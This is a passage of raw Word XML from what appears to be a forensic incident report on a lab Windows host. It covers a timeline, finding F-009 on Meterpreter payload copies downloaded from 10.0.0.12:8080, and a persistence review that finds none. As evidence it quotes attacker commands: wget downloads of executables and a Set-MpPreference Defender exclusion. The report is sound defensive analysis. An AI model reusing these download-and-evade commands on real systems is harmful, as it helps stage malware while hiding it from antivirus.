          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.838148</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>TASKLIST.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=2448BC7D False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\TASKLIST.EXE-2448BC7D.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.796776</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4798 | Microsoft-Windows-Security-Auditing | A user's local group membership was enumerated | Target: DESKTOP-KJ81A5A\Administrator (S-1-5-21-1841083384-974204330-411256071-500) | SubjectLogonId: 0x15347 | CallerProcessName: C:\Windows\System32\net1.exe | CallerProcessId: 0x480</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27065</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-009: Copies of the payload C:\Payloads\test.exe and C:\Users\medmondson\1.exe: downloaded from 10.0.0.12:8080, no execution evidence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artifact:powershell history (psreadline)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</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T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:38.642518 → 2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Payloads\test.exe: $MFT entry 80578, 986,624 bytes, $SI created 2023-11-10 10:21:41.003, modified 10:21:42.285; PSReadLine history order 3: "wget http://10.0.0.12:8080/pscp.exe -o test.exe" (executed in C:\Payloads\ after Set-MpPreference -ExclusionPath C:\Payloads\).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Users\medmondson\1.exe: $MFT entry 90508, 986,624 bytes, created 11:10:55.604, modified 11:10:56.932; PowerShell 4104 11:10:55.495 "wget http://10.0.0.12:8080/1.exe -o 1.exe" from powershell PID 736 GUID {e6e9f951-0f56-654e-af01-000000000500} (Meterpreter chain), Sysmon 3 to 10.0.0.12 at 11:10:55.573.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Edge cache copy pscp[1].exe (986,624 bytes) created 10:16:38.643.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Prefetch file (TEST.EXE / 1.EXE), no Sysmon EID 1, no Amcache, BAM, ShimCache, UserAssist, MUICache or SRUM entry was found for test.exe or 1.exe (queries on raw.prefetch, raw.amcache_files, raw.reg_bam, raw.shimcache, raw.dissect_muicache, raw.srum_*).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Identical size (986,624 B) and same source host suggest test.exe and 1.exe are copies of the same Meterpreter payload (test.exe is explicitly pscp.exe downloaded under another name); no hash is available for them (no Sysmon 1/Amcache), so identity with SHA256 ABBF7B5F… is a hypothesis to verify by hashing the files on disk. Prefetch was enabled and Sysmon was running when 1.exe was dropped, so the absence of execution traces for 1.exe is meaningful: it was most likely staged but never run before collection. test.exe was dropped before Sysmon install (10:51), but Prefetch would still have recorded its execution: none present.</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10:21:41.003421</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Payloads\test.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\1.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:38.642518</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $SI modification (M) ; $SI MFT change (C) ; $FN access (A)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\A6816M2V\pscp[1].exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#114957</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell history (PSReadLine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: mtime</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
              <w:br/>
              <w:t>command=wget http://10.0.0.12:8080/pscp.exe -o test.exe | order=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/powershell_history.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</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bl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I checked all the persistence locations listed for this step and found no attacker persistence (F-010, info/probable).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**What was checked**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Services:** System 7045 and Security 4697 events, raw.reg_services and the Sysmon 13 ImagePath writes. All are lab setup or vendor installs: VMware, Mozilla, Sysmon, WPD, Defender.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Scheduled tasks:** 4698/4702 and TaskScheduler 106 events, raw.reg_taskcache and Sysmon 11 writes under System32\Tasks. The tasks belong to Firefox, Defender, OneDrive and EdgeUpdate, and svchost created all of them.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Run/RunOnce keys:** these come from a legitimate OneDrive self-update at 11:13:46. Its process chain is OneDrive.exe → OneDriveSetup.exe → EdgeUpdate, which is not the injected explorer.exe 7324 chain.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Other registry autostarts:** no Winlogon, IFEO or SilentProcessExit values were found. AppInit_DLLs is empty.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **COM:** the 31 HKCU CLSID entries are OneDrive/EdgeUpdate registrations.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Active Setup, print monitors/processors, BootExecute/SetupExecute:** all stock values.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **WMI:** the only 5861 event is the default SCM Event Log Filter.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Startup folders and hosts:** the Startup folders hold only desktop.ini, and the hosts file is unchanged since 2019.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Attacker processes:** pscp.exe, explorer 7324 and cmd 5848 made no Sysmon registry or WMI changes. Their only file writes were 1.exe, a PSScriptPolicyTest file and a CLR usage log.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Conclusion**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>The Meterpreter session appears to have run in memory only, with no reboot persistence.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-010: No attacker persistence identified: services, tasks, Run keys, COM, AppInit, Active Setup, print monitors, WMI, Startup and hosts all reviewed and explained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artifact:registry (recmd, complementary batch)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-wmi-activity%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</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T1547.001, T1543.003, T1053.005, T1546.015, T1546.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2019-03-19 04:49:40.979782 → 2023-11-10 11:16:03.322916</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>What was reviewed and what it shows:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(1) Services</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- System 7045 records show only setup and vendor installs: Printer Extensions (2023-11-09 11:04), VMware Tools drivers and services (2023-11-10 10:14:18–10:14:42), Mozilla Maintenance Service (10:25:49), WPD FS driver (10:45:40) and Sysmon64/SysmonDrv (10:51:10, evtx row 27966).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Security 4697 events.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- raw.reg_services contains no ImagePath under Users, Payloads or Temp, and none using powershell or cmd. The only keys written after 10:55 are BITS (12:16:01, svchost netsvcs/qmgr.dll) and per-user service instances.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Sysmon 13 ImagePath writes at 10:52:42–10:52:46 come from services.exe and affect only the Defender services (WdNisSvc, WdBoot, WdFilter, WdNisDrv, WinDefend).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(2) Scheduled tasks</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Security 4698/4702 events, and TaskScheduler 106 entries are system only.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- TaskCache entries created on 2023-11-10:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Mozilla Firefox Default Browser Agent and Background Update (10:25:49 / 10:26:00)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Four Windows Defender tasks running MpCmdRun.exe (11:03:03)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - OneDrive Standalone Update Task-S-...-1001 (11:13:54)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Two MicrosoftEdgeUpdateTaskUser…Core/UA tasks (11:13:57)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- svchost PID 1136 created all of these task files (Sysmon 11, e.g. rows 18927, 19089).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(3) Run/RunOnce keys</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- HKLM Run holds SecurityHealth and VMware User Process.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- HKCU Run holds OneDrive /background and Microsoft Edge Update.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- HKCU RunOnce holds four OneDrive cleanup commands ("cmd /q /c del/rmdir" of the old OneDrive binaries).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon 13 shows the writers:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - OneDriveSetup.exe PID 3488 (GUID {e6e9f951-106b-654e-cf01-000000000500}), row 18928</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - MicrosoftEdgeUpdate.exe PID 4216 from Temp\EU3403.tmp, row 19088</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- That chain started at 11:13:46 from C:\Users\medmondson\AppData\Local\Microsoft\OneDrive\OneDrive.exe ("OneDriveSetup.exe /update /restart /updateSource:ODU", Sysmon 1 row 18698). It does not descend from the injected explorer.exe PID 7324 or from cmd 5848.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Winlogon Shell/Userinit, IFEO Debugger/GlobalFlag or SilentProcessExit values were found in raw.registry_kroll.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(4) AppInit_DLLs</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Empty in both the native and WOW6432Node keys.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(5) COM (HKCU\Software\Classes\CLSID)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- All 31 entries were written at 11:13:54–11:13:58.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- They point to the OneDrive 23.214.1015.0001 binaries (FileSyncShell64.dll, FileCoAuth.exe, Microsoft.SharePoint.exe, OneDrive.exe) or to EdgeUpdate psuser_64.dll. This is consistent with the OneDrive update above.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(6) Active Setup, Print Monitors/Processors, BootExecute/SetupExecute</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Active Setup StubPaths are stock Microsoft values.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Monitors are AppMon.dll, localspl.dll, FXSMON.DLL, tcpmon.dll, usbmon.dll and APMon.dll; the print processor is winprint.dll.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- BootExecute = "autocheck autochk *" (recmd_complement row 34), and SetupExecute is empty.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(7) WMI</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only WMI-Activity 5861 event (10:51:11, row 24734) is the default "SCM Event Log Filter" → NTEventLogEventConsumer binding.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(8) Startup folders and hosts</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Both the ProgramData and the user Startup folders contain only desktop.ini.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Windows\System32\drivers\etc\hosts is 824 bytes with $SI modified 2019-03-19 04:49:40, i.e. stock (MFT row 54482).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(9) Attacker processes</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Sysmon 12/13/14/19/20/21 events come from the attacker process GUIDs (pscp.exe …8f01…, explorer 7324 …9001…, cmd 5848 …ad01…).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Their only file writes (Sysmon 11) are __PSScriptPolicyTest_*.ps1 (11:06:40), C:\Users\medmondson\1.exe (11:10:55, powershell 736) and the CLR UsageLogs\explorer.exe.log (11:16:03).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
